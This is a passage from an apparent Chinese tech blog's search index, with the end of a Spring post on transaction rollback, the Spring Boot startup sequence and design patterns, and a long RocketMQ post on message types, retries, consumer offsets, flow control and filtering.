catch了B方法的异常，那这个事务不能正常回滚。\n因为当ServiceB中抛出了一个异常以后，ServiceB标识当前事务需要rollback。但是ServiceA中由于手动地捕获这个异常并进行处理，ServiceA认为当前事务应该正常commit。此时就出现了前后不一致，也就是因为这样，抛出了前面的UnexpectedRollbackException异常。\nSpring的事务是在调用业务方法之前开始的，业务方法执行完毕之后才执行commit or rollback，事务是否执行回滚取决于是否抛出runtime异常。如果抛出runtime exception 并在你的业务方法中没有catch到的话，事务会回滚。\n在业务方法中一般不需要catch异常，如果非要catch一定要抛出throw new RuntimeException()，或者注解中指定抛异常类型@Transactional(rollbackFor=Exception.class)，否则会导致事务失效，数据commit造成数据不一致，所以有些时候try catch反倒会画蛇添足。\n\n数据库引擎不支持事务\n\n\nSpring Boot启动流程每一个SpringBoot项目都有一个主入口，这个主入口就是Application启动类中的main方法，而main方法中又会调用run方法，run方法完成了Spring Boot的整个启动流程：\n首先，Spring Boot项目创建完成会默认生成一个名为 Application的入口类，通过该类的main方法启动Spring Boot项目，在main方法中会调用run方法，进行SpringApplication类的实例化操作，然后再针对实例化对象调用另外一个run方法来完成整个项目的初始化和启动。\nSpringApplication调用的run方法的大致流程：\npublic ConfigurableApplicationContext run(String... args) &#123;\tlong startTime = System.nanoTime();\tDefaultBootstrapContext bootstrapContext = this.createBootstrapContext();\tConfigurableApplicationContext context = null;\tthis.configureHeadlessProperty();\t//获取SpringApplicationListener监听器\tSpringApplicationRunListeners listeners = this.getRunListeners(args);\t//启动所获取到的所有监听器\tlisteners.starting(bootstrapContext, this.mainApplicationClass);\ttry &#123;\t\tApplicationArguments applicationArguments = new DefaultApplicationArguments(args);\t\t//准备环境\t\tConfigurableEnvironment environment = this.prepareEnvironment(listeners, bootstrapContext, applicationArguments);\t\tthis.configureIgnoreBeanInfo(environment);\t\t//打印Banner图标\t\tBanner printedBanner = this.printBanner(environment);\t\t//创建IoC容器\t\tcontext = this.createApplicationContext();\t\tcontext.setApplicationStartup(this.applicationStartup);\t\t//准备IoC容器\t\tthis.prepareContext(bootstrapContext, context, environment, listeners, applicationArguments, printedBanner);\t\t//刷新IoC容器\t\tthis.refreshContext(context);\t\tthis.afterRefresh(context, applicationArguments);\t\tDuration timeTakenToStartup = Duration.ofNanos(System.nanoTime() - startTime);\t\tif (this.logStartupInfo) &#123;\t\t\t(new StartupInfoLogger(this.mainApplicationClass)).logStarted(this.getApplicationLog(), timeTakenToStartup);\t\t&#125;\t\t//通知监听器，IoC容器启动完成\t\tlisteners.started(context, timeTakenToStartup);\t\t//执行ApplicationRunner和CommandLineRunner实现类中定义的runner方法（可自定义）\t\tthis.callRunners(context, applicationArguments);\t&#125; catch (Throwable var12) &#123;\t\tthis.handleRunFailure(context, var12, listeners);\t\tthrow new IllegalStateException(var12);\t&#125;\ttry &#123;\t\tDuration timeTakenToReady = Duration.ofNanos(System.nanoTime() - startTime);\t\tlisteners.ready(context, timeTakenToReady);\t\t//返回IoC容器\t\treturn context;\t&#125; catch (Throwable var11) &#123;\t\tthis.handleRunFailure(context, var11, (SpringApplicationRunListeners)null);\t\tthrow new IllegalStateException(var11);\t&#125;&#125;\n\nSpring用到的设计模式\n依赖倒置原则：Spring IoC的依赖注入实现了这一设计模式。\n代理模式：Spring AOP使用了动态代理，会创建代理对象。\n单例模式：Spring 中的 Bean 默认都是单例的。\n模板方法模式 : Spring 中 JdbcTemplate、HibernateTemplate 等以 Template 结尾的对数据库操作的类，它们就使用到了模板模式。\n观察者模式: 观察者模式是一种对象行为型模式。它表示的是一种对象与对象之间具有依赖关系，当一个对象发生改变的时候，依赖这个对象的所有对象也会做出反应。Spring 事件驱动模型就是观察者模式很经典的一个应用。\n工厂模式：Spring 使用工厂模式通过 BeanFactory、ApplicationContext 创建 bean 对象。\n适配器模式：适配器模式(Adapter Pattern) 将一个接口转换成客户希望的另一个接口，适配器模式使接口不兼容的那些类可以一起工作。Spring AOP 的增强或通知(Advice)使用到了适配器模式，与之相关的接口是AdvisorAdapter。\n……\n\nReferences\n王磊. Offer来了:Java面试核心知识点精讲. 北京: 电子工业出版社.\nhttps://javaguide.cn/system-design/framework/spring/spring-knowledge-and-questions-summary.html\nhttps://www.nowcoder.com/issue/tutorial?tutorialId=94&amp;uuid=267c9e9807174a559975edf9901aa8e2\n\n","categories":["IT"],"tags":["Spring"]},{"title":"RocketMQ","url":"/2023/05/24/RocketMQ/","content":"RocketMQ简介RocketMQ是一款由Alibaba研发的分布式的消息中间件。支持事务消息、顺序消息、延时消息、定时消息、批量消息。\nApache RocketMQ 中消息的生命周期主要分为消息生产、消息存储、消息消费这三部分。生产者生产消息并发送至 Apache RocketMQ 服务端（Broker），消息被存储在Broker的主题（Topic）中，主题内可以有多个消费队列，消费者通过订阅主题消费消息。\n消息中间件的应用场景消息中间件常用于分布式系统中的应用解耦、流量削峰填谷、异步处理等场景。比如，在秒杀业务中，下单后可以发送延迟消息，若5分钟未支付，就取消订单、回滚库存。\n消息队列的应用场景：\n\n应用解耦：系统的耦合度越高，容错性就越低。在等待系统恢复正常的时间里，要处理的数据可以被缓存到消息队列中。\n流量削峰填谷：消息到加入消息队列而不是直接发给消费者，消费者按照自己的消费速度从消息队列获取消息进行处理。\n异步处理：不需要同步处理完成后才能响应，由消息队列缓存消息后续通知消息接收方进行异步处理，提高了响应效率。\n\n模型概念服务端\nBroker\nBroker是Apache RocketMQ的服务端，生产者生产的消息会发送到 Broker，并存储在Broker的主题（Topic）中。\n\nNameServer\nNameServer是Broker注册中心，支持Broker的注册和发现、Topic路由、Broker心跳检测。\nNameServer通常采用集群的方式部署，各实例间互相不进行通信，Broker会向每一台NameServer注册，所以每一个NameServer都保存一份完整的路由信息，当某个NameServer下线了，Broker依然可以向其它的NameServer注册。\n\n\n消息生产\n生产者（Producer）：\nApache RocketMQ 中用于产生消息的运行实体，一般 集成于业务调用链路的上游。\n\n\n消息存储\n主题（Topic）：\nApache RocketMQ 消息传输和存储的分组容器，主题内部由多个队列组成，消息存储在主题内的队列中。\n\n队列（MessageQueue）：\nApache RocketMQ 消息传输和存储的实际单元容器，类比于其他消息队列中的分区。 Apache RocketMQ 通过流式特性的无限队列结构来存储消息，消息在队列内具备顺序性存储特征。\n\n消息（Message）：\nApache RocketMQ 的最小传输单元。消息具备不可变性，在初始化发送和完成存储后即不可变。\n\n队列类型（MessageType）：\n用于类型管理和安全验证的消息传输特性定义的类别。Apache RocketMQ支持NORMAL、FIFO、TRANSACTION和DELAY消息类型。\n\n消息视图（MessageView）：\n从开发的角度来看，MessageView 是消息的只读接口。消息视图允许读取消息中的多个属性和负载信息，但不能对消息本身进行任何更改。\n\n消息标签（MessageTag）：\nMessageTag是一个细粒度的消息分类属性，允许在主题级别以下对消息进行细分。消费者通过订阅特定标签来实现消息过滤。\n\n\n消息消费\n消费者分组（ConsumerGroup）：\nApache RocketMQ 发布订阅模型中定义的独立的消费身份分组，用于统一管理底层运行的多个消费者（Consumer）。同一个消费组的多个消费者必须保持消费逻辑和配置一致，共同分担该消费组订阅的消息，实现消费能力的水平扩展。\n\n消费者（Consumer）：\nApache RocketMQ 消费消息的运行实体，一般集成在业务调用链路的下游。消费者必须被指定到某一个消费组中。\n\n订阅关系（Subscription）：\nApache RocketMQ 发布订阅模型中消息过滤、重试、消费进度的规则配置。订阅关系以消费组为粒度进行管理，消费组通过定义订阅关系控制指定消费组下的消费者如何实现消息过滤、消费重试及消费进度恢复等。\nApache RocketMQ 的订阅关系除过滤表达式之外都是持久化的，即服务端重启或请求断开，订阅关系依然保留。\n\n消费结果（ConsumeResult）\nApache RocketMQ 中PushConsumer消费监听器处理消息完成后返回的处理结果，用来标识本次消息是否正确处理。消费结果包含消费成功和消费失败。\n\n\n消息类型\n普通消息\n普通消息为 Apache RocketMQ 中最基础的消息，区别于有特性的顺序消息、定时&#x2F;延时消息和事务消息。\n\n事务消息\n事务消息是Apache RocketMQ 提供的一种高级消息类型，支持在分布式场景下保障消息生产和本地事务的最终一致性。\n\n定时&#x2F;延时消息\n定时&#x2F;延时消息是Apache RocketMQ 提供的一种高级消息类型，消息被发送至服务端后，在指定时间后才能被消费者消费。通过设置一定的定时时间可以实现分布式场景的延时调度触发效果。\n\n顺序消息\n顺序消息是Apache RocketMQ 提供的一种高级消息类型，支持消费者按照发送消息的先后顺序获取消息，从而实现业务场景中的顺序处理。\n\n\n消息处理\n消息过滤\n消费者可以通过订阅指定消息标签（Tag）对消息进行过滤，确保最终只接收被过滤后的消息合集。过滤规则的计算和匹配在Apache RocketMQ 的服务端完成。更多信息，请参见消息过滤。\n\n重置消费位点\n以时间轴为坐标，在消息持久化存储的时间范围内，重新设置消费者分组对已订阅主题的消费进度，设置完成后消费者将接收设定时间点之后，由生产者发送到Apache RocketMQ 服务端的消息。更多信息，请参见重置消费位点。\n\n消息轨迹\n在一条消息从生产者发出到消费者接收并处理过程中，由各个相关节点的时间、地点等数据汇聚而成的完整链路信息。通过消息轨迹，能清晰定位消息从生产者发出，经由Apache RocketMQ 服务端，投递给消费者的完整链路，方便定位排查问题。\n\n消息堆积\n生产者已经将消息发送到Apache RocketMQ 的服务端，但由于消费者的消费能力有限，未能在短时间内将所有消息正确消费掉，此时在服务端保存着未被消费的消息，该状态即消息堆积。\n\n\n消息类型原理普通消息应用场景\n普通消息一般应用于微服务解耦、事件驱动、数据集成等场景，这些场景大多数要求数据传输通道具有可靠传输的能力，且对消息的处理时机、处理顺序没有特别要求。\n普通消息仅支持使用MessageType为Normal主题，即普通消息只能发送至类型为普通消息的主题中，发送的消息的类型必须和主题的类型一致。\n普通消息生命周期\n\n初始化：消息被生产者构建并完成初始化，待发送到服务端的状态。\n待消费：消息被发送到服务端，对消费者可见，等待消费者消费的状态。\n消费中：消息被消费者获取，并按照消费者本地的业务逻辑进行处理的过程。 此时服务端会等待消费者完成消费并提交消费结果，如果一定时间后没有收到消费者的响应，Apache RocketMQ会对消息进行重试处理。具体信息，请参见消费重试。\n消费提交：消费者完成消费处理，并向服务端提交消费结果，服务端标记当前消息已经被处理（包括消费成功和失败）。 Apache RocketMQ默认支持保留所有消息，此时消息数据并不会立即被删除，只是逻辑标记已消费。消息在保存时间到期或存储空间不足被删除前，消费者仍然可以回溯消息重新消费。\n消息删除：Apache RocketMQ按照消息保存机制滚动清理最早的消息数据，将消息从物理文件中删除。更多信息，请参见消息存储和清理机制。\n\n顺序消息顺序消息是 Apache RocketMQ 提供的一种高级消息类型，支持消费者按照发送消息的先后顺序获取消息，从而实现业务场景中的顺序处理。 相比其他类型消息，顺序消息在发送、存储和投递的处理过程中，更多强调多条消息间的先后顺序关系。\nApache RocketMQ 顺序消息的顺序关系通过消息组（MessageGroup）判定和识别，发送顺序消息时需要为每条消息设置归属的消息组，相同消息组的多条消息之间遵循先进先出的顺序关系，不同消息组、无消息组的消息之间不涉及顺序性。\n基于消息组的顺序判定逻辑，支持按照业务逻辑做细粒度拆分，可以在满足业务局部顺序的前提下提高系统的并行度和吞吐能力。\n顺序消息仅支持使用MessageType为FIFO的主题，即顺序消息只能发送至类型为顺序消息的主题中，发送的消息的类型必须和主题的类型一致。\n应用场景\n在有序事件处理、撮合交易、数据实时增量同步等场景下，异构系统间需要维持强一致的状态同步，上游的事件变更需要按照顺序传递到下游进行处理。在这类场景下使用 Apache RocketMQ 的顺序消息可以有效保证数据传输的顺序性。\n\n典型场景一：撮合交易\n以证券、股票交易撮合场景为例，对于出价相同的交易单，坚持按照先出价先交易的原则，下游处理订单的系统需要严格按照出价顺序来处理订单。\n\n典型场景二：数据实时增量同步\n以数据库变更增量同步场景为例，上游源端数据库按需执行增删改操作，将二进制操作日志作为消息，通过 Apache RocketMQ 传输到下游搜索系统，下游系统按顺序还原消息数据，实现状态数据按序刷新。如果是普通消息则可能会导致状态混乱，和预期操作结果不符，基于顺序消息可以实现下游状态和上游操作结果一致。\n\n\n如何保证消息的顺序性\nApache RocketMQ 的消息的顺序性分为两部分，生产顺序性和消费顺序性。\n\n生产顺序性 ：\nApache RocketMQ 通过生产者和服务端的协议保障单个生产者串行地发送消息，并按序存储和持久化。\n如需保证消息生产的顺序性，则必须满足以下条件：\n\n单一生产者：消息生产的顺序性仅支持单一生产者，不同生产者分布在不同的系统，即使设置相同的消息组，不同生产者之间产生的消息也无法判定其先后顺序。\n串行发送：Apache RocketMQ 生产者客户端支持多线程安全访问，但如果生产者使用多线程并行发送，则不同线程间产生的消息将无法判定其先后顺序。\n\n满足以上条件的生产者，将顺序消息发送至 Apache RocketMQ 后，会保证设置了同一消息组的消息，按照发送顺序存储在同一队列中。服务端顺序存储逻辑如下：\n\n相同消息组的消息按照先后顺序被存储在同一个队列。\n不同消息组的消息可以混合在同一个队列中，且不保证连续。\n\n\n\n\n如上图所示，消息组1和消息组4的消息混合存储在队列1中， Apache RocketMQ 保证消息组1中的消息G1-M1、G1-M2、G1-M3是按发送顺序存储，且消息组4的消息G4-M1、G4-M2也是按顺序存储，但消息组1和消息组4中的消息不涉及顺序关系。\n\n消费顺序性 ：\nApache RocketMQ 通过消费者和服务端的协议保障消息消费严格按照存储的先后顺序来处理。\n如需保证消息消费的顺序性，则必须满足以下条件：\n\n投递顺序\nApache RocketMQ 通过客户端SDK和服务端通信协议保障消息按照服务端存储顺序投递，但业务方消费消息时需要严格按照接收—处理—应答的语义处理消息，避免因异步处理导致消息乱序。\n备注：消费者类型为PushConsumer时， Apache RocketMQ 保证消息按照存储顺序一条一条投递给消费者，若消费者类型为SimpleConsumer，则消费者有可能一次拉取多条消息。此时，消息消费的顺序性需要由业务方自行保证。消费者类型的具体信息，请参见消费者分类。\n\n有限重试\nApache RocketMQ 顺序消息投递仅在重试次数限定范围内，即一条消息如果一直重试失败，超过最大重试次数后将不再重试，跳过这条消息消费，不会一直阻塞后续消息处理。\n对于需要严格保证消费顺序的场景，请务必设置合理的重试次数，避免参数不合理导致消息乱序。\n\n\n\n\n生产顺序性和消费顺序性组合\n如果消息需要严格按照先进先出（FIFO）的原则处理，即先发送的先消费、后发送的后消费，则必须要同时满足生产顺序性和消费顺序性。\n一般业务场景下，同一个生产者可能对接多个下游消费者，不一定所有的消费者业务都需要顺序消费，可以将生产顺序性和消费顺序性进行差异化组合，应用于不同的业务场景。例如发送顺序消息，但使用非顺序的并发消费方式来提高吞吐能力。\n顺序消息生命周期和普通消息的生命周期相同。\n事务消息Apache RocketMQ 提供的事务消息支持在分布式场景下保障消息的最终一致性。\n其它事务消息的处理方案\n\n传统XA事务方案：性能不足\n为了保证分支的执行结果一致性，典型方案是基于XA协议的分布式事务系统来实现。将多个调用分支封装成包含独立事务分支的大事务。基于XA分布式事务的方案可以满足业务处理结果的正确性，但最大的缺点是多分支环境下资源锁定范围大，并发度低，随着下游分支的增加，系统性能会越来越差。\n\n\n事务消息处理流程\n事务消息交互流程如下图所示。\n\n生产者将消息发送至Apache RocketMQ服务端。\nApache RocketMQ服务端将消息持久化成功之后，向生产者返回Ack确认消息已经发送成功，此时消息被标记为”暂不能投递”，这种状态下的消息即为半事务消息。\n生产者开始执行本地事务逻辑。\n生产者根据本地事务执行结果向服务端提交二次确认结果（Commit或是Rollback），服务端收到确认结果后处理逻辑如下：\n二次确认结果为Commit：服务端将半事务消息标记为可投递，并投递给消费者。\n二次确认结果为Rollback：服务端将回滚事务，不会将半事务消息投递给消费者。\n\n\n在断网或者是生产者应用重启的特殊情况下，若服务端未收到生产者提交的二次确认结果，或服务端收到的二次确认结果为Unknown未知状态，经过固定时间后，服务端将对消息生产者即生产者集群中任一生产者实例发起消息回查。 说明：服务端回查的间隔时间和最大回查次数，请参见参数限制。\n生产者收到消息回查后，需要检查对应消息的本地事务执行的最终结果。\n生产者根据检查到的本地事务的最终状态再次提交二次确认，服务端仍按照步骤4对半事务消息进行处理。\n\n事务消息生命周期\n\n初始化：半事务消息被生产者构建并完成初始化，待发送到服务端的状态。\n事务待提交：半事务消息被发送到服务端，和普通消息不同，并不会直接被服务端持久化，而是会被单独存储到事务存储系统中，等待第二阶段本地事务返回执行结果后再提交。此时消息对下游消费者不可见。\n消息回滚：第二阶段如果事务执行结果明确为回滚，服务端会将半事务消息回滚，该事务消息流程终止。\n（提交）待消费：第二阶段如果事务执行结果明确为提交，服务端会将半事务消息重新存储到普通存储系统中，此时消息对下游消费者可见，等待被消费者获取并消费。\n消费中：同普通消息的生命周期\n消费提交：同普通消息的生命周期\n消息删除：同普通消息的生命周期\n\n定时&#x2F;延时消息在分布式定时调度触发、任务超时处理等场景，需要实现精准、可靠的定时事件触发。使用 Apache RocketMQ 的定时消息可以简化定时调度任务的开发逻辑，实现高性能、可扩展、高可靠的定时触发能力。\n\n定时消息：例如，当前系统时间为2022-06-09 17:30:00，希望消息在下午19:20:00定时投递，则定时时间为2022-06-09 19:20:00，转换成时间戳格式为1654773600000。\n延时消息：例如，当前系统时间为2022-06-09 17:30:00，希望延时1个小时后投递消息，则需要根据当前时间和延时时长换算成定时时刻，即消息投递时间为2022-06-09 18:30:00，转换为时间戳格式为1654770600000。\n\n定时消息仅支持在 MessageType为Delay 的主题内使用，即定时消息只能发送至类型为定时消息的主题中，发送的消息的类型必须和主题的类型一致。\n应用场景\n\n典型场景一：分布式定时调度\n在分布式定时调度场景下，需要实现各类精度的定时任务，例如每天5点执行文件清理，每隔2分钟触发一次消息推送等需求。传统基于数据库的定时调度方案在分布式场景下，性能不高，实现复杂。基于 Apache RocketMQ 的定时消息可以封装出多种类型的定时触发器。\n\n典型场景二：任务超时处理\n以电商交易场景为例，订单下单后暂未支付，此时不可以直接关闭订单，而是需要等待一段时间后才能关闭订单。使用 Apache RocketMQ 定时消息可以实现超时任务的检查触发。\n\n\n定时消息生命周期\n\n初始化：同普通消息的生命周期\n定时中：消息被发送到服务端，和普通消息不同的是，服务端不会直接构建消息索引，而是会将定时消息单独存储在定时存储系统中，等待定时时刻到达。\n待消费：定时时刻到达后，服务端将消息重新写入普通存储引擎，对下游消费者可见，等待消费者消费的状态。\n消费中：同普通消息的生命周期\n消费提交：同普通消息的生命周期\n消息删除：同普通消息的生命周期\n\n消息发送重试Apache RocketMQ 客户端连接服务端发起消息发送请求时，可能会因为网络故障、服务异常等原因导致调用失败。为保证消息的可靠性， Apache RocketMQ 在客户端SDK中内置请求重试逻辑，尝试通过重试发送达到最终调用成功的效果。\n同步发送和异步发送模式均支持消息发送重试。\n\n同步发送：调用线程会一直阻塞，直到某次重试成功或最终重试失败，抛出错误码和异常。\n异步发送：调用线程不会阻塞，但调用结果会通过异常事件或者成功事件返回。\n\n重试流程：\n\n对于事务消息，只会进行透明重试（transparent retries），即请求超时或异常等场景不会进行重试。\n生产者在初始化时设置消息发送最大重试次数，当出现上述触发条件的场景时，生产者客户端会按照设置的重试次数一直重试发送消息，直到消息发送成功或达到最大重试次数重试结束，并在最后一次重试失败后返回调用错误响应。\n\n重试触发条件触发消息发送重试机制的条件包含调用失败、请求超时、连接失败或返回失败错误码，具体场景包含如下：\n\n客户端消息发送请求调用失败或请求超时\n网络异常造成连接失败或请求超时。\n服务端节点处于重启或下线等状态造成连接失败。\n服务端运行慢造成请求超时。\n服务端返回失败错误码\n系统逻辑错误：因运行逻辑不正确造成的错误。\n系统流控错误：因容量超限造成的流控错误。\n\n\n\n功能约束\n链路耗时阻塞评估：从上述重试机制可以看出，在重试流程中生产者仅能控制最大重试次数。若由于系统异常触发了SDK内置的重试逻辑，则服务端需要等待最终重试结果，可能会导致消息发送请求链路被阻塞。对于某些实时调用类场景，需要合理评估每次调用请求的超时时间以及最大重试次数，避免影响全链路的耗时。\n最终异常兜底： Apache RocketMQ 客户端内置的发送请求重试机制并不能保证消息发送一定成功。当最终重试仍然失败时，业务方调用需要捕获异常，并做好冗余保护处理，避免消息发送结果不一致。\n消息重复问题：因远程调用的不确定性，当Apache RocketMQ客户端因请求超时触发消息发送重试流程，此时客户端无法感知服务端的处理结果，客户端进行的消息发送重试可能会产生消息重复问题，业务逻辑需要自行处理消息重复问题。\n\n消费者分类Apache RocketMQ 支持 PushConsumer 、 SimpleConsumer 以及 PullConsumer 这三种类型的消费者。\n\n\n\n对比项\nPushConsumer\nSimpleConsumer\nPullConsumer\n\n\n\n接口方式\n推送：使用监听器回调接口返回消费结果，消费者仅允许在监听器范围内处理消费逻辑。\n拉取：业务方自行实现消息处理，并主动调用接口返回消费结果。\n拉取：业务方自行按队列拉取消息，并可选择性地提交消费结果。\n\n\n消费并发度管理\n由SDK管理消费并发度。\n由业务方消费逻辑自行管理消费线程。\n由业务方消费逻辑自行管理消费线程。\n\n\n负载均衡粒度\n5.0 SDK是消息粒度，更均衡，早期版本是队列维度\n消息粒度，更均衡\n队列粒度，吞吐攒批性能更好，但容易不均衡\n\n\n接口灵活度\n高度封装，不够灵活。\n原子接口，可灵活自定义。\n原子接口，可灵活自定义。\n\n\n适用场景\n适用于无自定义流程的业务消息开发场景。\n适用于需要高度自定义业务流程的业务开发场景。\n仅推荐在流处理框架场景下集成使用\n\n\n消息消费重试消费重试策略概述消费重试指的是，消费者在消费某条消息失败后，Apache RocketMQ 服务端会根据重试策略重新消费该消息，超过一次定数后若还未消费成功，则该消息将不再继续重试，直接被发送到死信队列中。\n消费重试的触发条件\n\n消费失败，包括消费者返回消息失败状态标识或抛出非预期异常。\n消息处理超时，包括在PushConsumer中排队超时。\n\n消费重试策略主要行为\n\n重试过程状态机：控制消息在重试流程中的状态和变化逻辑。\n重试间隔：上一次消费失败或超时后，下次重新尝试消费的间隔时间。\n最大重试次数：消息可被重试消费的最大次数。\n\nPushConsumer消费重试策略PushConsumer消费消息时，消息的几个主要状态（重试状态机）如下：\n\nReady：已就绪状态。消息在Apache RocketMQ服务端已就绪，可以被消费者消费。\n\nInflight：处理中状态。消息被消费者客户端获取，处于消费中还未返回消费结果的状态。\n\nWaitingRetry：待重试状态，PushConsumer独有的状态。当消费者消息处理失败或消费超时，会触发消费重试逻辑判断。如果当前重试次数未达到最大次数，则该消息变为待重试状态，经过重试间隔后，消息将重新变为已就绪状态可被重新消费。多次重试之间，可通过重试间隔进行延长，防止无效高频的失败。\n\nCommit：提交状态。消费成功的状态，消费者返回成功响应即可结束消息的状态机。\n\nDLQ：死信状态。消费逻辑的最终兜底机制，若消息一直处理失败并不断进行重试，直到超过最大重试次数还未成功，此时消息不会再重试，会被投递至死信队列。可以通过消费死信队列的消息进行业务恢复。\n\n\n消息重试过程中，每次重试消息状态都会经过已就绪&gt;处理中&gt;待重试的变化，两次消费间的间隔时间实际由消费耗时及重试间隔控制，消费耗时的最大上限受服务端系统参数控制，一般不应该超过上限时间。\n最大重试次数\nPushConsumer的最大重试次数由消费者分组创建时的元数据控制，具体参数，请参见消费者分组。\n例如，最大重试次数为3次，则该消息最多可被投递4次，1次为原始消息，3次为重试投递次数。\n重试间隔时间\n\n顺序消息：重试间隔为固定时间，具体取值，请参见参数限制。\n\n无序消息（非顺序消息）：重试间隔为阶梯时间，具体时间如下：\n\n\n\n第几次重试\n与上次重试的间隔时间\n第几次重试\n与上次重试的间隔时间\n\n\n\n1\n10秒\n9\n7分钟\n\n\n2\n30秒\n10\n8分钟\n\n\n3\n1分钟\n11\n9分钟\n\n\n4\n2分钟\n12\n10分钟\n\n\n5\n3分钟\n13\n20分钟\n\n\n6\n4分钟\n14\n30分钟\n\n\n7\n5分钟\n15\n1小时\n\n\n8\n6分钟\n16\n2小时\n\n\n若重试次数超过16次，后面每次重试间隔都为2小时。\n\n\nSimpleConsumer消费重试策略SimpleConsumer消费消息时，消息的几个主要状态（重试状态机）如下：\n\nReady：已就绪状态。消息在Apache RocketMQ服务端已就绪，可以被消费者消费。\n\nInflight：处理中状态。消息被消费者客户端获取，处于消费中还未返回消费结果的状态。\n\nCommit：提交状态。消费成功的状态，消费者返回成功响应即可结束消息的状态机。\n\nDLQ：死信状态。消费逻辑的最终兜底机制，若消息一直处理失败并不断进行重试，直到超过最大重试次数还未成功，此时消息不会再重试，会被投递至死信队列。可以通过消费死信队列的消息进行业务恢复。\n\n\n最大重试次数\nSimpleConsumer的最大重试次数由消费者分组创建时的元数据控制，具体参数，请参见消费者分组。\n消息重试间隔\n消息重试间隔 &#x3D; 不可见时间 - 消息实际处理时长\nSimpleConsumer 的消费重试间隔通过消息的不可见时间控制。例如，消息不可见时间为30 ms，实际消息处理用了10 ms就返回失败响应，则距下次消息重试还需要20 ms，此时的消息重试间隔即为20 ms；若直到30 ms消息还未处理完成且未返回结果，则消息超时，立即重试，此时重试间隔即为0 ms。\n消费进度管理消息位点参考 Apache RocketMQ 主题和队列的定义，消息是按到达服务端的先后顺序存储在指定主题的多个队列中，每条消息在队列中都有一个唯一的Long类型坐标，这个坐标被定义为消息位点。\n任意一个消息队列在逻辑上都是无限存储，即消息位点会从0到Long.MAX无限增加。通过主题、队列和位点就可以定位任意一条消息的位置。\nApache RocketMQ 定义队列中最早一条消息的位点为最小消息位点（MinOffset）；最新一条消息的位点为最大消息位点（MaxOffset）。虽然消息队列逻辑上是无限存储，但由于服务端物理节点的存储空间有限， Apache RocketMQ 会滚动删除队列中存储最早的消息。因此，消息的最小消息位点和最大消息位点会一直递增变化。 \n\n消费位点Apache RocketMQ 通过消费位点（ConsumerOffset）管理消息的消费进度。每条消息被某个消费者消费完成后不会立即在队列中删除，Apache RocketMQ 会基于每个消费者分组维护一份消费记录，该记录指定消费者分组消费某一个队列时，消费过的最新一条消息的位点，即消费位点。\n当消费者客户端离线，又再次重新上线时，会严格按照服务端保存的消费进度继续处理消息。如果服务端保存的历史位点信息已过期被删除，此时消费位点向前移动至服务端存储的最小位点。\n队列中消息位点MinOffset、MaxOffset和每个消费者分组的消费位点ConsumerOffset的关系如下：\n\n\nConsumerOffset≤MaxOffset：\n当消费速度和生产速度一致，且全部消息都处理完成时，最大消息位点和消费位点相同，即ConsumerOffset&#x3D;MaxOffset。\n当消费速度较慢小于生产速度时，队列中会有部分消息未消费，此时消费位点小于最大消息位点，即ConsumerOffset&lt;MaxOffset，两者之差就是该队列中堆积的消息量。\n\n\nConsumerOffset≥MinOffset：正常情况下有效的消费位点ConsumerOffset必然大于等于最小消息位点MinOffset。消费位点小于最小消息位点时是无效的，相当于消费者要消费的消息已经从队列中删除了，是无法消费到的，此时服务端会将消费位点强制纠正到合法的消息位点。\n\n消费位点初始值\n消费位点初始值指的是消费者分组首次启动消费者消费消息时，服务端保存的消费位点的初始值。\nApache RocketMQ 定义消费位点的初始值为消费者首次获取消息时，该时刻队列中的最大消息位点。相当于消费者将从队列中最新的消息开始消费。\n重置消费位点若消费者分组的初始消费位点或当前消费位点不符合的业务预期，可以通过重置消费位点调整消费进度。\n重置功能\nApache RocketMQ 的重置消费位点提供以下能力：\n\n重置到队列中的指定位点。\n重置到某一时刻对应的消费位点，匹配位点时，服务端会根据自动匹配到该时刻最接近的消费位点。\n\n适用场景\n\n初始消费位点不符合需求：因初始消费位点为当前队列的最大消息位点，即客户端会直接从最新消息开始消费。若业务上线时需要消费部分历史消息，可以通过重置消费位点功能消费到指定时刻前的消息。\n消费堆积快速清理：当下游消费系统性能不足或消费速度小于生产速度时，会产生大量堆积消息。若这部分堆积消息可以丢弃，可以通过重置消费位点快速将消费位点更新到指定位置，绕过这部分堆积的消息，减少下游处理压力。\n业务回溯，纠正处理：由于业务消费逻辑出现异常，消息被错误处理。若希望重新消费这些已被处理的消息，可以通过重置消费位点快速将消费位点更新到历史指定位置，实现消费回溯。\n\n使用限制\n\n重置消费位点后消费者将直接从重置后的位点开始消费，对于回溯重置类场景，重置后的历史消息大多属于存储冷数据，可能会造成系统压力上升，一般称为冷读现象。因此，需要谨慎评估重置消费位点后的影响。建议严格控制重置消费位点接口的调用权限，避免无意义、高频次的消费位点重置。\nApache RocketMQ 重置消费位点功能只能重置对消费者可见的消息，不能重置定时中、重试等待中的消息。更多信息，请参见定时&#x2F;延时消息和消费重试。\n\n消息流控消息流控指的是系统容量或水位过高， Apache RocketMQ 服务端会通过快速失败返回流控错误来避免底层资源承受过高压力。\n触发条件Apache RocketMQ 的消息流控触发条件如下：\n\n存储压力大：参考消费进度管理的原理机制，消费者分组的初始消费位点为当前队列的最大消费位点。若某些场景例如业务上新等需要回溯到指定时刻前开始消费，此时队列的存储压力会瞬间飙升，触发消息流控。\n服务端请求任务排队溢出：若消费者消费能力不足，导致队列中有大量堆积消息，当堆积消息超过一定数量后会触发消息流控，减少下游消费系统压力。\n\n流控行为当系统触发消息发送流控时，客户端会收到系统限流错误和异常，错误码信息如下：\n\nreply-code：530\nreply-text：TOO_MANY_REQUESTS\n\n客户端收到系统流控错误码后，会根据指数退避策略进行消息发送重试。\n处理建议\n如何避免触发消息流控：触发限流的根本原因是系统容量或水位过高，可以利用可观测性功能监控系统水位容量等，保证底层资源充足，避免触发流控机制。\n突发消息流控处理：如果因为突发原因触发消息流控，且客户端内置的重试流程执行失败，则建议业务方将请求调用临时替换到其他系统进行应急处理。\n\n消息过滤消息过滤功能过滤的含义指的是将符合条件的消息投递给消费者，而不是将匹配到的消息过滤掉。\nApache RocketMQ 的消息过滤功能通过生产者和消费者对消息的属性、标签进行定义，并在 Apache RocketMQ 服务端根据过滤条件进行筛选匹配，将符合条件的消息投递给消费者进行消费。\n消息过滤主要解决的单个业务域即同一个主题内不同消息子集的过滤问题，一般是基于同一业务下更具体的分类进行过滤匹配。如果是需要对不同业务域的消息进行拆分，建议使用不同主题处理不同业务域的消息。\n消息过滤原理消息过滤主要通过以下几个关键流程实现：\n\n生产者：生产者在初始化消息时预先为消息设置一些属性和标签，用于后续消费时指定过滤目标。\n消费者：消费者在初始化及后续消费流程中通过调用订阅关系注册接口，向服务端上报需要订阅指定主题的哪些消息，即过滤条件。\n服务端：消费者获取消息时会触发服务端的动态过滤计算，Apache 